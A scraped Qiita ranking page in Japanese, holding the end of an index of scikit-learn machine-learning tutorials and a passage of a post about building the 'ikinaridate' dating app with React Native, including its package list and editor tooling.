<p><a href="https://camo.qiitausercontent.com/e2b3b5ba5bed11dd69427f8ece7b17e0b6394ff7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f32656339303737302d643966632d313333332d636365302d3664616261386663653838362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e2b3b5ba5bed11dd69427f8ece7b17e0b6394ff7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f32656339303737302d643966632d313333332d636365302d3664616261386663653838362e706e67" alt="ml1.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/2ec90770-d9fc-1333-cce0-6daba8fce886.png"></a></p>

<p>まずはじめにWindows PCにJupyter Notebookとscikit-learnを導入し、Pythonで機械学習する環境を整えます。<br>
そして、「大規模なデータ」の線形なクラス分類手法であるSGD（stochastic gradient descent）というアルゴリズムを実装・解説します。<br>
模擬データとしては、有名なワインの分類データを使用します。<br>
ワインの色や成分から、ブドウの品種を分類します。<br>
<a href="http://neuro-educator.com/mlearn1/" rel="nofollow noopener" target="_blank">SGD｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>大規模なデータの非線形なクラス分類手法であるカーネル近似を実装・解説します。<br>
模擬データとしては、XORの関係を持つデータを使用します。<br>
通常のSGDでは、うまく分類できないですが、カーネル近似を使用することでうまくいくことを紹介します。<br>
<a href="http://neuro-educator.com/ml2/" rel="nofollow noopener" target="_blank">カーネル近似｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>データの線形なクラス分類手法であるLinear SVC（SVM classification）を実装・解説します。<br>
SVMの心や、通常の誤差を用いるSGDなどとの違いを説明します。<br>
模擬データとしては、ワインの分類を使用します。 <br>
<a href="http://neuro-educator.com/ml3/" rel="nofollow noopener" target="_blank">Linear SVC｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>データの非線形なクラス分類手法であるk近傍法を実装・解説します。<br>
模擬データとしては、XORの分類を使用します。 <br>
<a href="http://neuro-educator.com/ml4/" rel="nofollow noopener" target="_blank">k近傍法｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>データの非線形なクラス分類手法であるkernel SVCを実装・解説します。<br>
模擬データとしては、XORの分類を使用します。 <br>
<a href="http://neuro-educator.com/ml5/" rel="nofollow noopener" target="_blank">kernel SVC｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>データの非線形なクラス分類手法であるEnsemble Classificationを実装・解説します。<br>
ここではランダムフォレストをベースとします。<br>
模擬データとしては、XORの分類を使用します。 <br>
<a href="http://neuro-educator.com/ml6/" rel="nofollow noopener" target="_blank">Ensemble Classification｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>ここまでは単純なデータを扱いましたが、次にテキストデータのクラス分類を行います。<br>
ivedoorニュースコーパスの記事を使用し、ニュース記事のカテゴリーをナイーブベイズにより分類する手法を実装します。<br>
テキストデータを扱ううえで重要な、形態素解析による分かち書き、BoW（Bag-of-Words）、ナイーブベイズを順番に実装・解説します。<br>
また、ナイーブって日本語では”うぶ”という意味ですが、「うぶなベイズ」ってどういう意味なのかなども説明します。<br>
<a href="http://neuro-educator.com/ml7/" rel="nofollow noopener" target="_blank">ナイーブベイズ｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>以上でクラス分類の実装は終了ですが、各アルゴリズムを実装するさいに重要なハイパーパラメータをグリッドサーチと呼ばれる手法で決定する方法を実装・解説します。<br>
<a href="http://neuro-educator.com/ml8/" rel="nofollow noopener" target="_blank">ハイパーパラメータをグリッドサーチ｜Python、scikit-learnで機械学習を実装</a></p>

<h1>
<span id="クラスタ分析教師なし学習" class="fragment"></span><a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%BF%E5%88%86%E6%9E%90%E6%95%99%E5%B8%AB%E3%81%AA%E3%81%97%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>クラスタ分析・教師なし学習</h1>

<p><a href="https://camo.qiitausercontent.com/4c16de6d5bebbbaa1b75ab6ec5c5da13cc19e93a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f66663535643334642d336330362d346534352d313237332d3861633031313066336636632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4c16de6d5bebbbaa1b75ab6ec5c5da13cc19e93a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f66663535643334642d336330362d346534352d313237332d3861633031313066336636632e706e67" alt="ml2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/ff55d34d-3c06-4e45-1273-8ac0110f3f6c.png"></a></p>

<p>つぎに教師なし学習であるクラスタ分析を行います。</p>

<p>まずはじめに、いくつのクラスタに分かれるのかが事前にわかっている状況でのクラスタ分析手法を紹介します。</p>

<p>基本的な手法であるKMeansを実装・解説します。<br>
模擬データとしてはワインのデータを使用します。<br>
ワインデータには教師ラベル（どの品種か）が本当はわかりますが、これがなかったとしたらどのようにクラスター分けされるのかを確認します。<br>
<a href="http://neuro-educator.com/ml9/" rel="nofollow noopener" target="_blank">KMeans｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>KMeansではうまくクラスタ分けできないような非線形な構造を持ったデータに対するクラスタ分けを行います。<br>
ここではスペクトラルクラスタリングを実装・解説します。<br>
模擬データとしてはムーンと呼ばれる三日月が2つあるデータを使用します。<br>
KMeansではうまくクラスタ分けできず、スペクトラルクラスタリングで分けられることを確認します。<br>
<a href="http://neuro-educator.com/ml10/" rel="nofollow noopener" target="_blank">スペクトラルクラスタリング｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>非線形な構造を持ったデータに対するクラスタ分けである、GMM（Gaussian mixture models）を紹介します。<br>
模擬データとしてはムーンを使用します。<br>
<a href="http://neuro-educator.com/ml11/" rel="nofollow noopener" target="_blank">GMM｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>つぎに、いくつのクラスタに分かれるのか分からない状況でのクラスタ分類を行います。</p>

<p>MeanShiftと呼ばれる手法を実装・解説します。<br>
模擬データとしてはムーンを使用します。<br>
<a href="http://neuro-educator.com/ml12/" rel="nofollow noopener" target="_blank">MeanShift｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>VBGMM（Variational Bayesian Gaussian Mixture）と呼ばれる手法を実装・解説します。<br>
模擬データとしてはワインのデータを使用します。<br>
<a href="http://neuro-educator.com/ml13/" rel="nofollow noopener" target="_blank">VBGMM｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<h1>
<span id="回帰分析" class="fragment"></span><a href="#%E5%9B%9E%E5%B8%B0%E5%88%86%E6%9E%90"><i class="fa fa-link"></i></a>回帰分析</h1>

<p><a href="https://camo.qiitausercontent.com/d78f8d8a5c817b29cb6b5fd58ca2918a4ae61c69/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f66636332353638322d313539372d376430302d663033302d6535666332613030636366312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d78f8d8a5c817b29cb6b5fd58ca2918a4ae61c69/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f66636332353638322d313539372d376430302d663033302d6535666332613030636366312e706e67" alt="ml3.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/fcc25682-1597-7d00-f030-e5fc2a00ccf1.png"></a></p>

<p>目的変数y（非説明変数）が連続値であるときに、説明変数xを用いてyを近似的に求める手法（回帰）を実装・解説します。</p>

<p>もっとも基本的なSGD回帰分析（stochastic gradient descent Regressor）を実装・解説します。<br>
模擬データとしては、ボストン住宅価格と呼ばれるデータを使用します。<br>
部屋数や大通りへの距離、地域の犯罪発生率など13次元の説明変数xから、住宅価格yを求める式を立てます。<br>
<a href="http://neuro-educator.com/ml14/" rel="nofollow noopener" target="_blank">SGD回帰｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>つぎに、説明変数xの一部が重要な場合の回帰分析を行います。</p>

<p>LASSO回帰を実装・解説します。<br>
LASSO回帰はL1ノルムの正則化になります。<br>
L1ノルムで正則化することで、一部の次元だけが重要視される点などを解説します。<br>
模擬データとしては、ボストン住宅価格を使用します。<br>
<a href="http://neuro-educator.com/ml15/" rel="nofollow noopener" target="_blank">LASSO回帰｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>ElasticNet回帰を実装・解説します。<br>
ElasticNet回帰はL1ノルムとL2ノルムの正則化を両方使用します。<br>
模擬データとしては、ボストン住宅価格を使用します。<br>
<a href="http://neuro-educator.com/ml17/" rel="nofollow noopener" target="_blank">ElasticNet回帰｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>つぎに、説明変数xのすべてが重要な場合の回帰分析を行います。</p>

<p>説明変数xのすべてが重要な場合の回帰分析であるRidge回帰を実装・解説します。<br>
Ridge回帰はL2ノルムの正則化を使用します。<br>
L2ノルムで正則化することで、一部の次元だけが重要視されにくい点などを解説します。<br>
模擬データとしては、ボストン住宅価格を使用します。<br>
<a href="http://neuro-educator.com/ml16/" rel="nofollow noopener" target="_blank">Ridge回帰｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>Linear SVR回帰を実装・解説します。<br>
回帰分析にSVMを使用するイメージがわきませんが、どのように使用されているのかを解説します。<br>
模擬データとしては、ボストン住宅価格を使用します。<br>
<a href="http://neuro-educator.com/ml18/" rel="nofollow noopener" target="_blank">Linear SVR回帰｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>ここまでは直線で近似してきました。つぎに、非線形な回帰分析を行います。</p>

<p>rbfカーネル（ガウスカーネル）を使用したSVR回帰を実装・解説します。<br>
模擬データとしてはsin波を使用します。<br>
<a href="http://neuro-educator.com/ml19/" rel="nofollow noopener" target="_blank">SVR回帰｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>Ensemble Rigressorを使用した回帰分析を実装・解説します。<br>
ここでは、決定木をベースとしたBaggingRegressorを実装します。<br>
模擬データとしてはsin波を使用します。<br>
<a href="http://neuro-educator.com/ml20/" rel="nofollow noopener" target="_blank">Ensemble Rigressor｜Python、scikit-learnで機械学習を実装</a>  </p>

<h1>
<span id="データの次元圧縮" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E6%AC%A1%E5%85%83%E5%9C%A7%E7%B8%AE"><i class="fa fa-link"></i></a>データの次元圧縮</h1>

<p><a href="https://camo.qiitausercontent.com/3a75c053970e19760a9f13bd6238f8c0039af9a6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f65306635373936612d636236392d393561652d303439612d6334343033613534623064302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3a75c053970e19760a9f13bd6238f8c0039af9a6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f65306635373936612d636236392d393561652d303439612d6334343033613534623064302e706e67" alt="ml4.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/e0f5796a-cb69-95ae-049a-c4403a54b0d0.png"></a></p>

<p>多次元データの次元を圧縮する手法を解説します。</p>

<p>もっとも基本的なPCAについて実装・解説します。<br>
模擬データとしては、ボストン住宅価格を使用します。<br>
<a href="http://neuro-educator.com/ml21/" rel="nofollow noopener" target="_blank">PCA｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>つづいて非線形な構造をもつデータに対する次元圧縮手法を解説します。</p>

<p>カーネルトリックを利用した、Kernel-PCAを実装・解説します。<br>
模擬データとしてはムーンデータを使用します。<br>
ムーンは2次元データなので、次元は2次元のまま下がっていませんが、よりデータ構造が見やすいように新たな<br>
軸が作られることを確認します。<br>
<a href="http://neuro-educator.com/ml22/" rel="nofollow noopener" target="_blank">カーネルPCA｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>SpectralEmbeddingによる次元圧縮を実装・解説します。<br>
模擬データにはムーンデータを使用します。<br>
<a href="http://neuro-educator.com/ml23/" rel="nofollow noopener" target="_blank">SpectralEmbedding｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>多様体理論を利用したIsomapによる次元圧縮を実装・解説します。<br>
多様体というとなんだか難しそうですが、要は何をしているのかを説明します。<br>
模擬データにはムーンデータを使用します。<br>
<a href="http://neuro-educator.com/ml24/" rel="nofollow noopener" target="_blank">Isomap｜Python、scikit-learnで機械学習を実装</a></p>

<hr>

<p>多様体理論を利用したLLE（LocallyLinearEmbedding）による次元圧縮を実装・解説します。<br>
模擬データにはムーンデータを使用します。<br>
<a href="http://neuro-educator.com/ml25/" rel="nofollow noopener" target="_blank">LLE（LocallyLinearEmbedding）｜Python、scikit-learnで機械学習を実装</a> </p>

<p>以上でscikit-learnのアルゴリズムチートマップの全実装・解説となります。</p>

<h1>
<span id="おまけ" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91"><i class="fa fa-link"></i></a>おまけ</h1>

<p>最後におまけとして、初めてディープラーニングを使用して、ドラゴンボールの画像識別を行ってみました。</p>

<p><a href="http://neuro-educator.com/dbscouter/" rel="nofollow noopener" target="_blank">ディープラーニングを使ってドラゴンボールZのスカウターっぽいのを作ってみた (Python, Chainer, dlib, PyQt)</a></p>

<p><a href="https://camo.qiitausercontent.com/42c2b083cf051208f7e602bb915272678bda1007/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f35386532333361622d343366632d623636352d303365312d3735643435613362376565372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/42c2b083cf051208f7e602bb915272678bda1007/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f35386532333361622d343366632d623636352d303365312d3735643435613362376565372e706e67" alt="scouter.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/58e233ab-43fc-b665-03e1-75d45a3b7ee7.png"></a></p>

<p>以上となります。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">88位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>106</kbd>
		<a target="_blank" href="https://qiita.com/gogotanaka/items/07f9f5ed8e93a47a8bcd">[React Native事始め完全版]「いきなりデート」のアプリをReact Nativeで開発した知見をまとめます。</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-24<br />09:56:40</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/30440.html">gogotanaka</a>(57件の記事)<br />(慶應数学科休学 -> freee -> webpay -> aisaac.inc founder 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/30440/profile-images/1473685496">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[Rails]</b> <b>[es6]</b> <b>[React]</b> <b>[reactnative]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="この記事で説明する事" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%A7%E8%AA%AC%E6%98%8E%E3%81%99%E3%82%8B%E4%BA%8B"><i class="fa fa-link"></i></a>この記事で説明する事</h1>

<ul>
<li>React Native採用に係る意思決定の話</li>
<li>atom + eslint + flowによるIDE風開発環境</li>
<li>line by lineによるプロジェクト作成方法とリリース方法</li>
<li>デバッグ方法やtips集、補助ツールの使い方</li>
</ul>

<h1>
<span id="react-nativeとは" class="fragment"></span><a href="#react-native%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>React Nativeとは</h1>

<p><a href="https://camo.qiitausercontent.com/8f4d0015c77a3dd3afc74d65f59e36ec51343137/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f30363231663936662d616462642d316364622d636466362d6234636264303437633336642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8f4d0015c77a3dd3afc74d65f59e36ec51343137/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f30363231663936662d616462642d316364622d636466362d6234636264303437633336642e706e67" alt="rn.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/0621f96f-adbd-1cdb-cdf6-b4cbd047c36d.png"></a></p>

<p>Facebookがオープソースとして開発する<a href="https://reactjs.org/" rel="nofollow noopener" target="_blank">React.js</a>の思想の一つである<em>「Learn once, Write everywhere」</em>（元ネタはもちろんJavaの<em>Write once, Run anywhere</em>）を体現した、Facebookが開発主体となるプロジェクトの一つで、<strong>要はJavascriptとReactフレームワーク1つでモバイルアプリ（iosとAndroid）を作れる</strong>、といった代物です。</p>

<p>ちなみに<a href="https://facebook.github.io/react-vr/" rel="nofollow noopener" target="_blank">React VR</a>というJS+ReactでVRアプリを作るプロジェクト（これもFacebook本体が主導）というものあります。</p>

<p>同じようなクロスプラットフォームアプリ開発の手法としてCordovaやIonicなどがありますが、React Nativeはその名の通り、web viewではなくあくまでもJavaScriptランタイムでNativeのAPIを叩いて、Naitveによる描画を実現しています。</p>

<p>JSがNativeのコードにコンパイルされる訳でもないので、開発中においてはビルドの必要がなくHot Refreshなどが出来ます。</p>

<h1>
<span id="いきなりデートとは" class="fragment"></span><a href="#%E3%81%84%E3%81%8D%E3%81%AA%E3%82%8A%E3%83%87%E3%83%BC%E3%83%88%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>いきなりデートとは</h1>

<p><a href="https://camo.qiitausercontent.com/f915f86cd1ee9c8299ecfa3d53d270dde8d4f3d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f31373936306165392d333032622d643935332d323131352d3730653465366439616336312e706e67" target="_blank" rel="nofollow noopener"><img width="300" alt="Screen Shot 2017-10-07 at 1.37.29 PM.png" src="https://camo.qiitausercontent.com/f915f86cd1ee9c8299ecfa3d53d270dde8d4f3d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f31373936306165392d333032622d643935332d323131352d3730653465366439616336312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/17960ae9-302b-d953-2115-70e4e6d9ac61.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/446abc9c728c8a1b5b01ebbd500d18e1d2eb04d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f64303438363263652d626539622d343436362d633138362d6162623139636234333163322e706e67" target="_blank" rel="nofollow noopener"><img width="300" alt="Screen Shot 2017-11-24 at 9.40.32 AM.png" src="https://camo.qiitausercontent.com/446abc9c728c8a1b5b01ebbd500d18e1d2eb04d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f64303438363263652d626539622d343436362d633138362d6162623139636234333163322e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/d04862ce-be9b-4466-c186-abb19cb431c2.png"></a></p>

<p><a href="https://ikinaridate.com/" rel="nofollow noopener" target="_blank">いきなりデート</a>は、厳しい審査に通過したハイスペック男女同士のデートをセッティングするサービスです。</p>

<p>顔も名前も知らぬまま、メッセージすら事前にさせず運営の予約したレストランでまずは会って話して見る事に重きをおいています。</p>

<p><strong>開催場所のレストランも運営スタッフが手配するので手軽に参加できます。</strong></p>

<p>今回はこのサービスをアプリ化した際に得れた知見をまとめたいと思います。</p>

<h1>
<span id="react-native本当にいい感じに動くの" class="fragment"></span><a href="#react-native%E6%9C%AC%E5%BD%93%E3%81%AB%E3%81%84%E3%81%84%E6%84%9F%E3%81%98%E3%81%AB%E5%8B%95%E3%81%8F%E3%81%AE"><i class="fa fa-link"></i></a>React Native、本当にいい感じに動くの？</h1>

<p>と思われる方は</p>

<ul>
<li><a href="https://itunes.apple.com/jp/app/%E3%81%84%E3%81%8D%E3%81%AA%E3%82%8A%E3%83%87%E3%83%BC%E3%83%88/id1273579885?mt=8" rel="nofollow noopener" target="_blank">iOSダウンロード</a></li>
<li><a href="https://play.google.com/store/apps/details?id=com.ikinaridate" rel="nofollow noopener" target="_blank">Androidダウンロード</a></li>
</ul>

<p>より使い心地をお試し下さい。</p>

<p>（宣伝です！🔥）</p>

<h1>
<span id="なぜreact-nativeなのか" class="fragment"></span><a href="#%E3%81%AA%E3%81%9Creact-native%E3%81%AA%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>なぜReact Nativeなのか</h1>

<p>いきなりデートを運営してる <a href="http://aisaac.in/" rel="nofollow noopener" target="_blank">aisaac inc.</a> は37siginalsやthoughtbotなどのようにエンジニアが好き好きにOSSに成果物をあげまくったり自己資本で自由に大学のラボ的なノリで様々なビジネスを回しておるため、極限まで効率を重視したくAPI開発を含めてiOS/Androidのリリースをアプリ開発経験のないエンジニア2人（1人は週末のみ）で3週間くらいでやりたいなと思っていました。（結果、出来ました🎉🎉🎉）</p>

<p>最初こそ「Swift勉強するか〜〜〜」と考えあぐねておりましたが、</p>

<p>👥 &lt; 「React Native、いいらしいよ」<br>
という噂をよく聞くようになったので海外の事例など含めて徹底的に調査しました。</p>

<p>React Nativeリリース直後にその思想こそは確認したものの、かなりその方向性には懐疑的でした。<br>
というのも筆者は数年前にtitanium mobileに痛い目をみているので「またか」程度のものでした。</p>

<p>がやはりFacebookという組織の後ろ盾の大きさか、コミュニティもプロジェクトも大変よく成長しており、一ヶ月毎のRelease Noteを見る限り、健全なfixとimprovementsが確認でき「期待できるかも」と思いました。その後、様々な事例を調べfacebook/instagramは元よりsoundcloudやairbnbが採用（一部らしいが）している事も大きな追い風になりました。</p>

<p>パフォーマンスについてはこの記事をみて問題ない事を確信しました。</p>

<p><a href="https://medium.com/the-react-native-log/comparing-the-performance-between-native-ios-swift-and-react-native-7b5490d363e2" class="autolink" rel="nofollow noopener" target="_blank">https://medium.com/the-react-native-log/comparing-the-performance-between-native-ios-swift-and-react-native-7b5490d363e2</a><br>
（現在翻訳記事を執筆中です🖋）</p>

<h1>
<span id="開発した主な機能" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%81%97%E3%81%9F%E4%B8%BB%E3%81%AA%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>開発した主な機能</h1>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" checked disabled>Push通知🚀</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" checked disabled>Facebookログイン🚪</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" checked disabled>クレカ決済💳</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" checked disabled>画像アップロード📷</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" checked disabled>各種CRUD</li>
</ul>

<p>これらについては後ほど解説を致します。</p>

<h1>
<span id="諸々構成" class="fragment"></span><a href="#%E8%AB%B8%E3%80%85%E6%A7%8B%E6%88%90"><i class="fa fa-link"></i></a>諸々構成</h1>

<h2>
<span id="使っている主なパッケージ" class="fragment"></span><a href="#%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E4%B8%BB%E3%81%AA%E3%83%91%E3%83%83%E3%82%B1%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>使っている主なパッケージ</h2>

<p>もう、えいやとpackage.jsonから抜粋して主要なものを貼り付けちゃいます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>"react": "16.0.0-alpha.12",
"react-native": "0.47.1",
"react-native-drawer": "^2.3.0",
"react-native-facebook-login": "^1.5.0",
"react-native-fcm": "^8.0.0",
"react-native-image-picker": "^0.26.4",
"react-native-snap-carousel": "^2.4.0",
"react-native-vector-icons": "^4.3.0",
"react-navigation": "^1.0.0-beta.12",
"react-redux": "^5.0.5",
"redux": "^3.7.2",
"redux-persist": "^4.8.2",
"redux-persist-migrate": "^4.1.0",
"redux-thunk": "^2.2.0"

//dev
"babel-eslint": "^8.0.1",
"babel-plugin-transform-flow-strip-types": "^6.22.0",
"babel-preset-react-native": "4.0.0",
"eslint": "^4.2.0",
"eslint-plugin-flowtype": "^2.39.1",
"eslint-plugin-react": "^7.1.0",
"react-test-renderer": "16.1.1",
"reactotron-react-native": "^1.12.1",
"reactotron-redux": "^1.12.0"
</pre></div></div>

<p>reduxの採用はパッケージ選択において一番の正解だったのと思っております。<br>
httpリクエストは標準の <code>fetch</code> をベースに独自クラスを作って使ってます。</p>

<p>大雑把に</p>

<ul>
<li>
<code>react-native-facebook-login</code> ... Facebookログイン</li>
<li>
<code>react-native-fcm</code> ... Firebase(push notification)</li>
<li>
<code>react-native-vector-icons</code> ... アイコン</li>
<li>
<code>react-native-image-picker</code> ... 画像アップロード</li>
<li>
<code>babel-plugin-transform-flow-strip-types</code>, <code>eslint-plugin-flowtype</code> ... jsの型チェッカー、flowのためのパッケージ</li>
</ul>

<p>って感じです。</p>

<h2>
<span id="フォルダ構成" class="fragment"></span><a href="#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E6%A7%8B%E6%88%90"><i class="fa fa-link"></i></a>フォルダ構成</h2>

<p>割と普通のreduxアプリの構成だと思います。</p>

<p><a href="https://camo.qiitausercontent.com/595269f4316a90b6287d278653827fa70c46bd60/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f62643462343363322d666562652d366466372d333834322d6265613563343732343766302e706e67" target="_blank" rel="nofollow noopener"><img width="279" alt="Screen Shot 2017-10-07 at 1.37.29 PM.png" src="https://camo.qiitausercontent.com/595269f4316a90b6287d278653827fa70c46bd60/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f62643462343363322d666562652d366466372d333834322d6265613563343732343766302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/bd4b43c2-febe-6df7-3842-bea5c47247f0.png"></a></p>

<h2>
<span id="開発に使ったツール達" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%81%AB%E4%BD%BF%E3%81%A3%E3%81%9F%E3%83%84%E3%83%BC%E3%83%AB%E9%81%94"><i class="fa fa-link"></i></a>開発に使ったツール達</h2>

<ul>
<li><p><code>Atom + eslint</code> + <code>flow</code><br>
=&gt; linterと型チェッカー</p></li>
<li><p><code>Reactoron</code><br>
=&gt; Redux storeの中身が見れたりdispatchを手動で発行できます。</p></li>
<li><p><code>Xcode + AndroidStudio</code><br>
=&gt; リリース作業を考えておくと慣れておいた方がいいですね。</p></li>
<li><p><code>(Expo)</code> =&gt; 結果捨てました。。m_ _m</p></li>
</ul>

<h2>
<span id="atom--eslint--flow-でide風開発" class="fragment"></span><a href="#atom--eslint--flow-%E3%81%A7ide%E9%A2%A8%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>Atom + eslint + flow でIDE風開発</h2>

<p>今回はEditerにatomを採用しました。js開発ぽい雰囲気が出るので。<br>
<code>eslint</code> というlinterライブラリとjsの型チェッカーである <code>flow</code> には何度も助けられました。</p>

<p><a href="https://camo.qiitausercontent.com/ae25c0d2082bc0914ff4097da2e6814baba08e33/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f63653430306137642d663939302d663333362d333336622d6634363131306663313365342e706e67" target="_blank" rel="nofollow noopener"><img width="1052" alt="Screen Shot 2017-11-24 at 7.22.55 AM.png" src="https://camo.qiitausercontent.com/ae25c0d2082bc0914ff4097da2e6814baba08e33/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f63653430306137642d663939302d663333362d333336622d6634363131306663313365342e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/ce400a7d-f990-f336-336b-f46110fc13e4.png"></a></p>

<p>この様に未定義変数など簡単なタイポやシンタックスエラーはeslintでエラーを吐いてくれます。<br>
この環境はeslintの設定と <code>atom-eslint</code> というatomのパッケージによって達成されます。</p>

<p>続いてはflow+atomの挙動はこんな感じ、アプリ開発でjava/swiftに慣れている型はやはり型があった方が安心感があるでしょう。</p>

<p><a href="https://camo.qiitausercontent.com/8904f8de150ae021fd3a29f63a3d7f5c0a4ffbf3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f35626237383964302d356233342d383635302d623036642d3961376631653333646434612e706e67" target="_blank" rel="nofollow noopener"><img width="794" alt="Screen Shot 2017-11-24 at 7.53.14 AM.png" src="https://camo.qiitausercontent.com/8904f8de150ae021fd3a29f63a3d7f5c0a4ffbf3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f35626237383964302d356233342d383635302d623036642d3961376631653333646434612e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/5bb789d0-5b34-8650-b06d-9a7f1e33dd4a.png"></a></p>

<p>この環境はflowの設定と <code>linter-flow</code> というatomのパッケージによって達成されます。</p>

<h3>
